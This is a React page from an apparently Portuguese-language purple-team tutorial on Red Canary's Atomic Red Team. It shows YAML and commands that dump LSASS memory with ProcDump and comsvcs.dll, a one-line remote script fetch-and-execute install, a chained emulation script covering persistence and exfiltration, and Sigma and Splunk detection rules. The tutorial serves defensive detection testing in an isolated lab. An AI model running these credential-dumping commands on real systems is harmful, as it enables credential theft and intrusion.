import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function AtomicRedTeam() {
  return (
    <PageContainer
      title="Atomic Red Team — testar detecção (Purple Team)"
      subtitle="Biblioteca aberta da Red Canary com testes pequenos (atomics) mapeados ao MITRE ATT&CK. Você executa, o blue team confirma se viu."
      difficulty="intermediario"
      timeToRead="20 min"
    >
      <h2>O que é Atomic Red Team</h2>
      <p>
        ART é uma coleção de <strong>atomics</strong> — testes pequenos,
        determinísticos, cada um simulando UMA técnica do MITRE ATT&CK
        (T1059.001, T1003.001, etc.). Cada atomic tem comando exato, plataforma
        suportada, requisitos e cleanup. Ideal para responder a pergunta:
        <em>"meu SIEM/EDR detecta X?"</em>.
      </p>
      <p>
        É a base do <strong>Purple Team</strong>: red gera o sinal de forma
        controlada, blue valida a detecção e ajusta regras (Sigma, Sentinel KQL,
        Splunk SPL, Elastic EQL).
      </p>

      <h2>Anatomia de um atomic (YAML)</h2>
      <CodeBlock
        language="yaml"
        title="T1003.001/T1003.001.yaml — LSASS Memory Dump"
        code={`attack_technique: T1003.001
display_name: 'OS Credential Dumping: LSASS Memory'
atomic_tests:
- name: Dump LSASS.exe Memory using ProcDump
  auto_generated_guid: 36d1ae31-c0ce-4b67-b9b9-3a37ad486804
  description: |
    Procdump da Sysinternals cria um minidump do processo LSASS,
    que pode ser processado offline com Mimikatz / pypykatz.
  supported_platforms:
    - windows
  input_arguments:
    output_file:
      description: Arquivo de saída do dump
      type: path
      default: 'C:\\Windows\\Temp\\lsass_dump.dmp'
    procdump_exe:
      description: Caminho para procdump.exe
      type: path
      default: 'PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe'
  dependency_executor_name: powershell
  dependencies:
    - description: Procdump precisa estar disponível
      prereq_command: |
        if (Test-Path "#{procdump_exe}") {exit 0} else {exit 1}
      get_prereq_command: |
        Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\\Procdump.zip"
        Expand-Archive "$env:TEMP\\Procdump.zip" "PathToAtomicsFolder\\..\\ExternalPayloads\\" -Force
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      "#{procdump_exe}" -accepteula -ma lsass.exe #{output_file}
    cleanup_command: |
      del "#{output_file}" >nul 2> nul`}
      />

      <h2>Instalação (executor PowerShell)</h2>
      <Terminal
        path="C:\\>"
        user="redteam"
        host="WIN10-LAB"
        lines={[
          {
            cmd: "Set-ExecutionPolicy Bypass -Scope CurrentUser -Force",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -getAtomics",
            out: `Installing Invoke-AtomicRedTeam from https://github.com/redcanaryco/invoke-atomicredteam
Module Invoke-AtomicRedTeam installed at C:\\AtomicRedTeam\\invoke-atomicredteam
Cloning atomics from https://github.com/redcanaryco/atomic-red-team
Atomics installed at C:\\AtomicRedTeam\\atomics
[+] Installation complete`,
            outType: "success",
          },
          {
            cmd: "Import-Module 'C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1' -Force",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "Get-Command -Module Invoke-AtomicRedTeam",
            out: `CommandType  Name                                       Version
-----------  ----                                       -------
Function     Invoke-AtomicTest                          1.0.4
Function     Invoke-SetupAtomicsFolder                  1.0.4
Function     Invoke-GenerateNewAtomicTechnique          1.0.4`,
            outType: "info",
          },
        ]}
      />

      <h2>Comandos principais</h2>
      <CommandTable
        title="Invoke-AtomicTest — flags essenciais"
        variations={[
          { cmd: "Invoke-AtomicTest All -ShowDetails", desc: "Lista TODOS os testes detalhados (longo).", output: "Saída em tela com nome, plataformas, executor de cada atomic." },
          { cmd: "Invoke-AtomicTest T1003.001 -ShowDetails", desc: "Detalha apenas T1003.001 (LSASS).", output: "Mostra atomic_tests com seus argumentos e comandos." },
          { cmd: "Invoke-AtomicTest T1003.001 -ShowDetailsBrief", desc: "Resumo sem comandos.", output: "Lista numerada de atomics da técnica." },
          { cmd: "Invoke-AtomicTest T1003.001 -CheckPrereqs", desc: "Confere dependências sem executar.", output: "Procdump found: True" },
          { cmd: "Invoke-AtomicTest T1003.001 -GetPrereqs", desc: "Baixa o que falta (procdump, exes externos).", output: "Downloading Procdump.zip..." },
          { cmd: "Invoke-AtomicTest T1003.001 -TestNumbers 1", desc: "Roda só o atomic #1 da técnica.", output: "Executando, sai com status." },
          { cmd: "Invoke-AtomicTest T1003.001 -InputArgs @{output_file='C:\\\\temp\\\\x.dmp'}", desc: "Sobrescreve argumentos.", output: "Customiza paths/payloads." },
          { cmd: "Invoke-AtomicTest T1003.001 -Cleanup", desc: "Roda o cleanup_command (apaga artefatos).", output: "Removendo arquivos criados." },
          { cmd: "Invoke-AtomicTest T1003.001 -WhatIf", desc: "Dry-run: mostra o que rodaria sem rodar.", output: "Útil para revisão antes de pull-trigger." },
          { cmd: "Invoke-AtomicTest T1003.001 -LoggingModule 'Attire-ExecutionLogger'", desc: "Loga tudo em formato Attire (JSON p/ ingestão).", output: "Gera attire-log.json com timestamps." },
        ]}
      />

      <h2>Rodar um teste end-to-end</h2>
      <Terminal
        path="C:\\>"
        user="redteam"
        host="WIN10-LAB"
        lines={[
          {
            cmd: "Invoke-AtomicTest T1003.001 -ShowDetailsBrief",
            out: `PathToAtomicsFolder = C:\\AtomicRedTeam\\atomics

T1003.001-1 Dump LSASS.exe Memory using ProcDump
T1003.001-2 Dump LSASS.exe Memory using comsvcs.dll
T1003.001-3 Dump LSASS.exe Memory using direct system calls and API unhooking
T1003.001-4 Dump LSASS.exe using imported Microsoft DLLs`,
            outType: "info",
          },
          {
            cmd: "Invoke-AtomicTest T1003.001 -TestNumbers 2 -CheckPrereqs",
            out: `PathToAtomicsFolder = C:\\AtomicRedTeam\\atomics

CheckPrereq's for: T1003.001-2 Dump LSASS.exe Memory using comsvcs.dll
Prerequisites met: T1003.001-2 Dump LSASS.exe Memory using comsvcs.dll`,
            outType: "success",
          },
          {
            cmd: "Invoke-AtomicTest T1003.001 -TestNumbers 2",
            out: `Executing test: T1003.001-2 Dump LSASS.exe Memory using comsvcs.dll
Done executing test: T1003.001-2

Output:
LSASS PID: 712
Writing dump file C:\\Windows\\Temp\\lsass-comsvcs.dmp ...
Dump file written successfully (88.4 MB)`,
            outType: "warning",
          },
          {
            cmd: "Invoke-AtomicTest T1003.001 -TestNumbers 2 -Cleanup",
            out: `Executing cleanup for test: T1003.001-2
Removed: C:\\Windows\\Temp\\lsass-comsvcs.dmp`,
            outType: "muted",
          },
        ]}
      />

      <h2>O outro lado — o que o blue team deve ver</h2>
      <p>
        Cada atomic deveria gerar telemetria. Exemplo do <strong>T1003.001-2</strong>
        (comsvcs.dll dump): <code>rundll32.exe comsvcs.dll, MiniDump 712 ... full</code>.
      </p>

      <CodeBlock
        language="yaml"
        title="Sigma rule esperada disparando"
        code={`title: LSASS Memory Dump via comsvcs.dll MiniDump
id: 6e3bd510-f1ec-4c5f-9f5f-65b04e5f2b85
status: stable
description: Detecta uso de rundll32 + comsvcs.dll MiniDump (T1003.001).
author: Florian Roth
references:
  - https://attack.mitre.org/techniques/T1003/001/
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\rundll32.exe'
    CommandLine|contains|all:
      - 'comsvcs'
      - 'MiniDump'
  condition: selection
falsepositives:
  - Quase nenhum legítimo. Investigue 100%.
level: high
tags:
  - attack.credential_access
  - attack.t1003.001`}
      />

      <Terminal
        path="C:\\>"
        user="blueteam"
        host="SOC-CONSOLE"
        lines={[
          {
            comment: "consultando Splunk após disparar o atomic",
            cmd: "search index=winevt sourcetype=Sysmon EventCode=1 CommandLine=\"*comsvcs*MiniDump*\"",
            out: `_time                Computer    User       CommandLine                                                                ParentImage
2026-04-03 14:08:34  WIN10-LAB   redteam    rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 lsass.dmp full   C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`,
            outType: "success",
          },
        ]}
      />

      <h2>Roda em Linux também</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "ART funciona com pwsh em Linux",
            cmd: "sudo apt install -y powershell",
            out: "Setting up powershell (7.4.1-1.deb) ...",
            outType: "info",
          },
          {
            cmd: "pwsh",
            out: `PowerShell 7.4.1
Type 'help' to get help.

PS />`,
            outType: "muted",
          },
          {
            cmd: "IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -getAtomics",
            out: "[+] Installation complete (Linux)",
            outType: "success",
          },
          {
            cmd: "Invoke-AtomicTest T1059.004 -ShowDetailsBrief",
            out: `T1059.004-1 Create and Execute Bash Shell Script
T1059.004-2 Command-Line Interface
T1059.004-3 Harvest SUID Executables
T1059.004-4 Shellshock Bash CVE-2014-6271`,
            outType: "info",
          },
          {
            cmd: "Invoke-AtomicTest T1059.004 -TestNumbers 3",
            out: `Executing test: T1059.004-3 Harvest SUID Executables
Output:
/usr/bin/sudo
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
Done executing test: T1059.004-3`,
            outType: "warning",
          },
        ]}
      />

      <h2>Plano de execução (chains)</h2>
      <p>
        Em vez de 1 atomic isolado, encadeie técnicas para imitar uma campanha
        real (Initial Access → Execution → Persistence → Discovery → Credential
        Access → Lateral Movement → Exfiltration). A Red Canary publica o
        <strong>Atomic Test Harnesses</strong> e o time MITRE/CTID publica
        <strong>Adversary Emulation Plans</strong> (FIN6, APT29, OilRig).
      </p>

      <CodeBlock
        language="powershell"
        title="exec-chain.ps1 — encadeando para emular FIN7-like"
        code={`$tests = @(
  'T1566.001',  # Spearphishing Attachment
  'T1204.002',  # User Execution: Malicious File
  'T1059.001',  # PowerShell
  'T1547.001',  # Boot/Logon Autostart Run Keys
  'T1018',      # Remote System Discovery
  'T1003.001',  # LSASS Memory
  'T1021.001',  # Remote Services: RDP
  'T1041'       # Exfiltration over C2 channel
)

foreach ($t in $tests) {
  Write-Host "[*] Executando $t"
  Invoke-AtomicTest $t -CheckPrereqs
  Invoke-AtomicTest $t
  Start-Sleep -Seconds 30
  Invoke-AtomicTest $t -Cleanup
}`}
      />

      <h2>Logging Attire (consumir no Purple report)</h2>
      <Terminal
        path="C:\\>"
        user="redteam"
        host="WIN10-LAB"
        lines={[
          {
            cmd: "Invoke-AtomicTest T1059.001 -LoggingModule Attire-ExecutionLogger",
            out: `Executing test: T1059.001-1
Logging to: C:\\Users\\redteam\\AppData\\Local\\Temp\\attire-log_2026-04-03_14-22-11.json`,
            outType: "info",
          },
          {
            cmd: "Get-Content $env:TEMP\\attire-log_*.json | ConvertFrom-Json | Select -Expand procedures | Format-Table -Auto procedure_name, technique_id, time_stop",
            out: `procedure_name                                  technique_id   time_stop
--------------                                  ------------   ---------
PowerShell-Mimikatz                             T1059.001      2026-04-03T14:22:18Z
Encoded-Command-IEX-from-stdin                  T1059.001      2026-04-03T14:22:34Z`,
            outType: "success",
          },
        ]}
      />

      <h2>Sigma — convertendo para sua plataforma</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "pip install sigma-cli pysigma-backend-splunk pysigma-backend-elasticsearch",
            out: "Successfully installed sigma-cli-1.0.4 ...",
            outType: "info",
          },
          {
            cmd: "sigma convert -t splunk -p sysmon ./rules/lsass_dump.yml",
            out: `Image="*\\\\rundll32.exe" CommandLine="*comsvcs*" CommandLine="*MiniDump*"`,
            outType: "success",
          },
          {
            cmd: "sigma convert -t lucene -p sysmon ./rules/lsass_dump.yml",
            out: `Image:*\\\\rundll32.exe AND CommandLine:(*comsvcs* AND *MiniDump*)`,
            outType: "default",
          },
          {
            cmd: "sigma convert -t azure -p sysmon ./rules/lsass_dump.yml",
            out: `(Image endswith @"\\\\rundll32.exe") and (CommandLine contains "comsvcs" and CommandLine contains "MiniDump")`,
            outType: "muted",
          },
        ]}
      />

      <PracticeBox
        title="Purple Team mini-engagement"
        goal="Disparar 5 atomics em VM Windows controlada e validar detecção em Sysmon + Sigma rule local."
        steps={[
          "Suba VM Windows 10 com Sysmon (config swiftonsecurity).",
          "Instale ART e baixe atomics.",
          "Rode T1003.001-2, T1059.001-1, T1547.001-1, T1018-1, T1041-1.",
          "Em cada um, depois do executar: olhe Event Viewer → Sysmon (EventID 1).",
          "Confirme se a CommandLine bate com a Sigma rule esperada.",
          "Rode -Cleanup em todos.",
          "Documente: detectado / não detectado / parcial.",
        ]}
        command={`# no Windows VM (PowerShell admin)
foreach ($t in 'T1003.001','T1059.001','T1547.001','T1018','T1041') {
  Invoke-AtomicTest $t -CheckPrereqs -GetPrereqs
  Invoke-AtomicTest $t -TestNumbers 1
  Start-Sleep 10
  Invoke-AtomicTest $t -TestNumbers 1 -Cleanup
}`}
        expected={`Executing test: T1003.001-1 Dump LSASS.exe Memory using ProcDump
Done executing test: T1003.001-1
Executing test: T1059.001-1 Mimikatz
Done executing test: T1059.001-1
[...]`}
        verify="Em Event Viewer → Applications and Services → Microsoft → Windows → Sysmon → Operational, EventID 1 deve mostrar cada um dos comandos. Se Defender bloquear, vc validou que ele detecta — ainda mais valor."
      />

      <AlertBox type="warning" title="Lab isolado, sempre">
        <p>
          ART executa código real (despeja LSASS, cria persistence, escala
          privilégios). Rode <strong>somente</strong> em VM dedicada,
          desconectada da rede corporativa, com snapshot pré-execução.
          Defender/EDR DEVEM estar ativos para o Purple ter sentido — mas
          configure exceções de leitura/escrita do path C:\\AtomicRedTeam se
          quiser permitir o setup inicial.
        </p>
      </AlertBox>

      <AlertBox type="info" title="Ecossistema Purple">
        <p>
          <strong>Atomic Red Team</strong> (Red Canary) — atomics individuais.
          <br />
          <strong>CALDERA</strong> (MITRE) — automação de chains via agente Sandcat.
          <br />
          <strong>Stratus Red Team</strong> (DataDog) — atomics para Cloud (AWS/GCP/Azure/K8s).
          <br />
          <strong>VECTR</strong> (SecurityRiskAdvisors) — gestão de campanhas Purple e relatórios.
          <br />
          <strong>SigmaHQ</strong> + <strong>HELK/Splunk</strong> — pipeline de detecção.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
